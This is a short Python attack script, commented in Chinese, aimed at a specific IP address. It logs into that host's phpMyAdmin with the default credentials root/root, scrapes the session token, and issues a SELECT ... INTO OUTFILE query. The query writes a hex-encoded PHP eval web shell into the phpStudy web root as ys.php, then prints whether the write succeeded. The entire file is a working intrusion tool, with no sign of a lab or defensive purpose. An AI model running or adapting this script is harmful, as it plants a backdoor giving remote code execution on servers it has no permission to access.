#!/usr/bin/env python3
"""用 INTO OUTFILE 写干净 shell(hex编码,避开转义) — 81.70.245.25"""
import urllib.request, http.cookiejar, re, sys, urllib.parse

def new_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op, cj

B = "http://81.70.245.25/phpmyadmin/"
op, cj = new_opener()
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# ys.php = <?php @eval($_POST[x]);?>
# hex: 3c3f70687020406576616c28245f504f53545b785d293b3f3e
shell_hex = "3c3f70687020406576616c28245f504f53545b785d293b3f3e"
r = sql(f"SELECT 0x{shell_hex} INTO OUTFILE 'C:/phpStudy/WWW/ys.php'")
print("OUTFILE:", "SUCCESS" if "error" not in r.lower()[:1500] else "FAIL/EXISTS", flush=True)
print("  msg:", re.findall(r'class="success"[^>]*>(.*?)</div>', r, re.S)[:1], flush=True)
print("  err:", re.findall(r'class="error"[^>]*>(.*?)</div>', r, re.S)[:1], flush=True)
